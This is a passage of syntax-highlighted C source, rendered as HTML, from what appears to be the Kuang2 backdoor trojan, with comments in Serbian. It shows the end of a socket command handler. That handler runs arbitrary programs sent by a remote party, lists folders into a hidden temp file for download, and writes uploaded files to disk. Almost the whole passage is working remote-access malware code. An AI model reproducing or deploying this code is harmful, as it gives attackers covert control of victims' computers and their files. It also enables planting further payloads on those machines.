                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">K2_RUN_FILE</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">STARTUPINFO</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc11">pi</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">cb</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">STARTUPINFO</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">cbReserved2</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">lpReserved</span><span class="sc10">=</span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">lpReserved2</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">lpTitle</span><span class="sc10">=</span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">lpDesktop</span><span class="sc10">=(</span><span class="sc11">LPTSTR</span><span class="sc10">)</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">dwFlags</span><span class="sc10">=</span><span class="sc11">STARTF_FORCEOFFFEEDBACK</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CreateProcess</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">bdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NORMAL_PRIORITY_CLASS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPTSTR</span><span class="sc10">)</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">si</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pi</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">K2_FOLDER_INFO</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">FileData</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hSearch</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">fFinished</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc2">// prvo kreira jedinstveno ime fajla za prenos FOLDER_LIST
</span><span class="sc0">                </span><span class="sc11">GetTempFileName</span><span class="sc10">(</span><span class="sc11">temppath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Kuang2_class</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filelist</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">fajl</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">filelist</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">hSearch</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">bdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FileData</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// traÇi...
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">fajl</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hSearch</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc2">// ako ne naîe prvi fajl ili fajl nije otvoren
</span><span class="sc0">                    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">filelist</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">fFinished</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">    </span><span class="sc2">// vrti za sve fajlove, 'buffer' je slobodan
</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileData</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">temp</span><span class="sc10">=</span><span class="sc11">FileData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// veliÅina fajla u KB
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileData</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">++;</span><span class="sc0">      </span><span class="sc2">// da 0 fajl bude zaista 0
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileData</span><span class="sc10">.</span><span class="sc11">nFileSizeHigh</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// ako je fajl jako veliki
</span><span class="sc0">                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s &lt;%1luk&gt;"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc2">// upiÑi string u fajl, zajedno sa NULL terminatorom na kraju
</span><span class="sc0">                    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlengthF</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">// uzima sledeÜi fajl
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hSearch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FileData</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()==</span><span class="sc11">ERROR_NO_MORE_FILES</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc2">// doÑli smo na kraj - nema viÑe fajlova
</span><span class="sc0">                            </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// poÑalji oznaku za kraj
</span><span class="sc0">                            </span><span class="sc11">strcopyF</span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">bdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filelist</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// i ime fajla za download
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// nastupila je greÑka
</span><span class="sc0">
                        </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hSearch</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// zatvori pretragu
</span><span class="sc0">                        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// zatvori fajl
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">==</span><span class="sc11">K2_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">filelist</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFFER_SIZE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">fFinished</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">K2_UPLOAD_FILE</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc2">// faza #1
</span><span class="sc0">                </span><span class="sc11">fajlsize</span><span class="sc10">=</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">param</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">fajl</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">sdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// nastupila je greÑka
</span><span class="sc0">                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// sve je ok.
</span><span class="sc0">                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">// faza #2
</span><span class="sc0">                </span><span class="sc11">downloaded</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">downloaded</span><span class="sc10">!=</span><span class="sc11">fajlsize</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">bytes_recieved</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFFER_SIZE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">// primi deo fajla
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bytes_recieved</span><span class="sc10">==</span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WSAGetLastError</span><span class="sc10">()!=</span><span class="sc11">WSAEWOULDBLOCK</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">bytes_recieved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bytes_recieved</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">downloaded</span><span class="sc10">+=</span><span class="sc11">bytes_recieved</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc2">// faza #3
</span><span class="sc0">                </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_DONE</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// sve je ok.
</span><span class="sc0">                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc11">k2_msg</span><span class="sc10">-&gt;</span><span class="sc11">command</span><span class="sc10">=</span><span class="sc11">K2_ERROR</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msgsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
